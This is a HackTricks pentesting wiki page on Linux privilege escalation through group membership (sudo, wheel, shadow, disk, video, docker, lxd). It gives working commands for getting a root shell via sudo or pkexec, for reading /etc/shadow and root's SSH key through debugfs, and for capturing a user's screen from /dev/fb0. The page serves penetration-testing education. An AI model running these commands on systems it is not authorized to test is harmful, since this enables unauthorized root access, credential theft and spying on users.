

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Sudo/Admin Groups

## **PE - Method 1**

**Sometimes**, **by default \(or because some software needs it\)** inside the **/etc/sudoers** file you can find some of these lines:

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.

If this is the case, to **become root you can just execute**:

```text
sudo su
```

## PE - Method 2

Find all suid binaries and check if there is the binary **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

If you find that the binary pkexec is a SUID binary and you belong to sudo or admin, you could probably execute binaries as sudo using pkexec.  
Check the contents of:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

There you will find which groups are allowed to execute **pkexec** and **by default** in some linux can **appear** some of the groups **sudo or admin**.

To **become root you can execute**:

```bash
pkexec "/bin/sh" #You will be prompted for your user password
```

If you try to execute **pkexec** and you get this **error**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:

```text
%wheel	ALL=(ALL:ALL) ALL
```

This means that **any user that belongs to the group wheel can execute anything as sudo**.

If this is the case, to **become root you can just execute**:

```text
sudo su
```

# Shadow Group

Users from the **group shadow** can **read** the **/etc/shadow** file:

```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

So, read the file and try to **crack some hashes**.

# Disk Group

 This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.

Files:`/dev/sd[a-z][1-9]`

```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:

```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Permission denied**" error.

# Video Group

Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.

The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:

![](../../.gitbook/assets/image%20%28208%29.png)

Then modify the Width and Height to the ones used on the screen and check different Image Types \(and select the one that shows better the screen\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Group

It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...

**Check which files root members can modify**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

# Docker Group

You can mount the root filesystem of the host machine to an instance’s volume, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Group

[lxc - Privilege Escalation](lxd-privilege-escalation.md)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


